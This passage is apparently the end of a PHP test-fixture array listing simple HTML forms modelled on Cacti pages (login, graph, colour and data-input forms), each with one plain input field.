  'source form 53' => '<html><body><form method="post"><input name=\'x\'></form></body></html>',
  'source form 54' => '<html><body><form name=\'form_graph_items\' action=\'graphs_items.php\'><input name=\'x\'></form></body></html>',
  'source form 55' => '<html><body><form name=\'form_snmpagent_manager_logs\' action=\'managers.php\'><input name=\'x\'></form></body></html>',
  'source form 56' => '<html><body><form name=\'login\' method=\'post\' action=\'auth_changepassword.php\'><input name=\'x\'></form></body></html>',
  'source form 57' => '<html><body><form id=\'login\' name=\'login\' method=\'post\' action=\'index.php\'><input name=\'x\'></form></body></html>',
  'source form 58' => '<html><body><form name=\'form_timespan_selector\' method=\'post\' action=\'/cacti/graph_view.php\'><input name=\'x\'></form></body></html>',
  'source form 6' => '<html><body><form id=\'form_cdef\' action=\'cdef.php\'><input name=\'x\'></form></body></html>',
  'source form 7' => '<html><body><form id=\'form_color\' action=\'color.php\'><input name=\'x\'></form></body></html>',
  'source form 8' => '<html><body><form id=\'form_data_debug\' name=\'form_data_debug\' action=\'data_debug.php\'><input name=\'x\'></form></body></html>',
  'source form 9' => '<html><body><form id=\'form_data_input\' method=\'get\' action=\'data_input.php\'><input name=\'x\'></form></body></html>',
);
